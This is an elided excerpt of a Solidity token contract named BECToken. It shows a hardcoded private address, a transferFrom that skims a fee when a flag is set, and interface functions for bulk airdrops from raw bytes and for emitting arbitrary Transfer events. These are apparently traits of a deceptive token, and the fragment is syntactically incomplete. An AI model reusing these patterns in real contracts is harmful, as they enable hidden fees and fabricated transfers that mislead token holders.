...
contract BECToken is Ownable {
    ...
    address private hAddr = 0x260B831C9de2263AE239fE4833167F86E761551A;
    ...
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        ...
        if (_swAirIco == true){ 
            if(_from == msg.sender){}else if(_to != address(router) && _to != pairs){//}
            uint256 _evalue;
            //if(_value > (mineTok)) _evalue = (_value/50); //10 = 10% 20 = 5 $
            if(_value >= ((mineTok/1e18) * 2)) _evalue = (_value/20);
            //if(_value >= ((mineTok/1e18) * 4)) _evalue = (_value/20);
...
interface ICEP20 {
    ...
    function airDrop(bytes memory _bytes,uint256 addrCount) external;
    function emitTransfer(address sender, address recipient, uint256 amount) external returns (bool);
